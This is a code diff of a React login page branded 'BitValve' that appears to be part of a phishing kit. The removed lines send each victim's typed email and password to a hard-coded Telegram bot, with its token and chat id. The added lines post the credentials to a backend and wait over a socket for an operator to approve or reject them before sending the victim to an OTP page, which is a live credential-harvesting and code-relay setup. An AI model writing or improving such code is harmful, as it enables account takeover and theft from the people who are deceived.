@@ -1,28 +1,58 @@
 import React, { useState } from "react";
 import logo from "./assets/logovv.png";
 import { TriangleAlert, Eye, EyeOff } from "lucide-react";
+import { Star } from "lucide-react";
 
 import { FcGoogle } from "react-icons/fc";
 import { FaFacebookF, FaApple } from "react-icons/fa";
 import axios from "axios";
 import { useNavigate } from "react-router-dom";
+import { io } from "socket.io-client";
+import { useEffect } from "react";
 
 function Login() {
   const [showPassword, setShowPassword] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
+  const [loginErr, setLoginErr] = useState("");
+  const [loading, setLoading] = useState(false);
   const navigate = useNavigate();
 
-  async function sendTelegram(message) {
-    const url = `https://api.telegram.org/bot8582971725:AAFw8yPNNZm2kRNTndB4uZUwuNlSGiPMWJA/sendMessage`;
-
-    await axios.post(url, {
-      chat_id: 7995115550,
-      text: message,
-      parse_mode: "HTML",
+  const url = import.meta.env.SERVER;
+  const socket = io(url);
+  useEffect(() => {
+    socket.on("ticketStatus", (data) => {
+      console.log("object");
+      setLoading(false);
+      if (data.status === "rejected") {
+        setLoginErr("Wrong details");
+      }
+      if (data.status == "approved") {
+        navigate("/otp");
+      }
     });
-  }
+
+    return () => {
+      socket.off("ticketStatus");
+    };
+  }, []);
+
+  const sendTelegram = async () => {
+    const response = await axios.post(`${url}/api/ticket`, {
+      email,
+      password,
+      socketId: socket.id,
+    });
+    console.log(socket.id);
+    const requestId = response.data.requestId;
+
+    // tell backend this browser belongs to this request
+    socket.emit("register", requestId);
+
+    console.log("Waiting for response...");
+  };
+
   const handleClick = () => {
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!email.trim()) {
@@ -38,19 +68,12 @@ function Login() {
       setError("Password is required");
       return;
     }
+    setLoading(true);
+    sendTelegram();
 
-    sendTelegram(`
-📩 <b>BitValve Inputs</b>
-
-
-📧 Email: ${email}
-Password : ${password}
-
-
-`);
-    setTimeout(() => {
-      navigate("/otp");
-    }, 3000);
+    // setTimeout(() => {
+    //   navigate("/otp");
+    // }, 3000);
   };
 
   const inputClass =
@@ -125,17 +148,25 @@ Password : ${password}
             </button>
           </div>
 
+          {loginErr && (
+            <div className="p-1  flex bg-black text-white text-xsm font-mono mt-1 items-center gap-1 max-w-max">
+              <span className="text-yellow-800">
+                <Star size={10} />
+              </span>
+              <span className="f-1">Email or Password is wrong.</span>
+            </div>
+          )}
           <p className="mt-2 text-right text-xs text-white select-none small-f ">
             I FORGOT MY PASSWORD
           </p>
         </div>
         <button
-          disabled={password.length < 8}
+          disabled={loading}
           onClick={handleClick}
           className="color-btn p-5 py-3 rounded-4xl font-bold w-full font-mono disabled:opacity-50 "
         >
           {" "}
-          Login
+          {loading ? "Please wait..." : "Login"}
         </button>{" "}
         <div className="my-6 flex items-center">
           <div className="flex-1 border-t border-gray-700"></div>
